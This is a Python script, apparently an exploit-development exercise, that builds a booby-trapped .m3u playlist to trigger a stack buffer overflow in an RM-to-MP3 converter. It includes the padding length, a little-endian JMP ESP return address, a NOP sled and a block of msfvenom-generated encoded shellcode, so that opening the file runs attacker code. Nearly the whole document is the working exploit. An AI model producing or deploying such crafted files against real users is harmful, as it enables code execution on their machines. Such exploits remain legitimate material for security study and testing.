******************************************************************************************************************************
#This is a python script that generates a .m3u file type. When loaded on an  RM to MP3 converter, it crashes the application. 
#The buf shellcode is generated using msfvenom from the Metasploitable framework.
*******************************************************************************************************************************

header= "EXTM3U\r\n" #header format of .m3u file type

line1= "EXTINF:105, Example artist - Example title\r\n" #Information about an audio file 
url_part1= "http://" #First part of the URL that does not change
junk1= "A" * 26105
eip="\xC8\x12\x48\x78" #jump ESP value  written in Little endian 
junk2= "C" * 500
buf =  "" #Shellcode generated from running the payload
buf += "\x2b\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xb3\xbe\xd2\x8c\x83\xee\xfc\xe2\xf4\x4f\x56"
buf += "\x50\x8c\xb3\xbe\xb2\x05\x56\x8f\x12\xe8\x38\xee\xe2"
buf += "\x07\xe1\xb2\x59\xde\xa7\x35\xa0\xa4\xbc\x09\x98\xaa"
buf += "\x82\x41\x7e\xb0\xd2\xc2\xd0\xa0\x93\x7f\x1d\x81\xb2"
buf += "\x79\x30\x7e\xe1\xe9\x59\xde\xa3\x35\x98\xb0\x38\xf2"
buf += "\xc3\xf4\x50\xf6\xd3\x5d\xe2\x35\x8b\xac\xb2\x6d\x59"
buf += "\xc5\xab\x5d\xe8\xc5\x38\x8a\x59\x8d\x65\x8f\x2d\x20"
buf += "\x72\x71\xdf\x8d\x74\x86\x32\xf9\x45\xbd\xaf\x74\x88"
buf += "\xc3\xf6\xf9\x57\xe6\x59\xd4\x97\xbf\x01\xea\x38\xb2"
buf += "\x99\x07\xeb\xa2\xd3\x5f\x38\xba\x59\x8d\x63\x37\x96"
buf += "\xa8\x97\xe5\x89\xed\xea\xe4\x83\x73\x53\xe1\x8d\xd6"
buf += "\x38\xac\x39\x01\xee\xd6\xe1\xbe\xb3\xbe\xba\xfb\xc0"
buf += "\x8c\x8d\xd8\xdb\xf2\xa5\xaa\xb4\x41\x07\x34\x23\xbf"
buf += "\xd2\x8c\x9a\x7a\x86\xdc\xdb\x97\x52\xe7\xb3\x41\x07"
buf += "\xe6\xbb\xe7\x82\x6e\x4e\xfe\x82\xcc\xe3\xd6\x38\x83"
buf += "\x6c\x5e\x2d\x59\x24\xd6\xd0\x8c\xa2\xe2\x5b\x6a\xd9"
buf += "\xae\x84\xdb\xdb\x7c\x09\xbb\xd4\x41\x07\xdb\xdb\x09"
buf += "\x3b\xb4\x4c\x41\x07\xdb\xdb\xca\x3e\xb7\x52\x41\x07"
buf += "\xdb\x24\xd6\xa7\xe2\xfe\xdf\x2d\x59\xdb\xdd\xbf\xe8"
buf += "\xb3\x37\x31\xdb\xe4\xe9\xe3\x7a\xd9\xac\x8b\xda\x51"
buf += "\x43\xb4\x4b\xf7\x9a\xee\x8d\xb2\x33\x96\xa8\xa3\x78"
buf += "\xd2\xc8\xe7\xee\x84\xda\xe5\xf8\x84\xc2\xe5\xe8\x81"
buf += "\xda\xdb\xc7\x1e\xb3\x35\x41\x07\x05\x53\xf0\x84\xca"
buf += "\x4c\x8e\xba\x84\x34\xa3\xb2\x73\x66\x05\x22\x39\x11"
buf += "\xe8\xba\x2a\x26\x03\x4f\x73\x66\x82\xd4\xf0\xb9\x3e"
buf += "\x29\x6c\xc6\xbb\x69\xcb\xa0\xcc\xbd\xe6\xb3\xed\x2d"
buf += "\x59"


nops = "\x90" * 16 #no operation code for padding the payload
payload= junk1 + eip + nops + buf + junk2
url_part2= ".maggiemusic.com/rock.m3u" #second part of the url that remains static

exploit=open("C:\m3u_exploit4.m3u","w") #Creating a .m3u file
exploit.write(header + line1 + url_part1 + payload + url_part2) #writing into the file.
